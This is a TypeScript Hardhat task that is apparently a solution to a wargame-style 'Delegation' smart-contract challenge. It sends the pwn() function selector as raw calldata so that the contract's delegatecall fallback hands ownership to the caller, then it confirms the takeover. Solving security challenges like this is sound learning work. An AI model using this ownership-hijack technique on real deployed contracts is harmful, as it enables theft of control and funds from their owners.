import { task } from 'hardhat/config';
import { ContractReceipt, ContractTransaction, utils } from 'ethers';
import { Delegation } from '../../typechain';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/dist/src/signer-with-address';
import { TASK_PWN } from '../task-names';
import { Network } from '@ethersproject/networks/lib/types';

import delegationAbi from '../../data/abi/Delegation.json';

task(TASK_PWN, 'Break this contract')
  .setAction(async (_taskArgs, hre) => {

    const wallets: SignerWithAddress[] = await hre.ethers.getSigners();
    const userWallet = wallets[1];

    const address = await userWallet.getAddress();
    console.log(`user address: ${address}`);

    const network: Network = await hre.ethers.provider.getNetwork();
    console.log(`network: ${network.name}`);

    let delegationContractAddress = '';
    if (network.name === 'rinkeby') {
      delegationContractAddress = process.env.RINKEBY_DELEGATION_CONTRACT_ADDRESS || '';
    } else if (network.name === 'unknown') { //localhost network
      delegationContractAddress = process.env.LOCALHOST_DELEGATION_CONTRACT_ADDRESS || '';
    }
    console.log(`contractAddress: ${delegationContractAddress}`);

    const delegationContract: Delegation = new hre.ethers.Contract(delegationContractAddress, delegationAbi, userWallet) as Delegation;

    // Show Previous Owner
    const prevOwner: string = await delegationContract.owner();
    console.log(`Prev owner: ${prevOwner}`);

    // Change Owner
    const pwner = utils.keccak256(utils.toUtf8Bytes('pwn()')).substring(0, 10);
    console.log(pwner);
    const changeOwnerTx: ContractTransaction = await userWallet.sendTransaction({ to: delegationContract.address, data: pwner, gasLimit: 60000 });

    const contractReceipt: ContractReceipt = await changeOwnerTx.wait();

    if (contractReceipt.status === 1) {
      console.log("Change Owner Successful");
    } else {
      console.log('Change Owner Failed');
    }

    // Get New Owner
    const newOwner: string = await delegationContract.owner();
    console.log(`New owner: ${newOwner}`);

    if (newOwner === userWallet.address) {
      console.log("Claim ownership success");
    } else {
      console.log('Claim ownership failed');
    }

    process.exit(0)
  });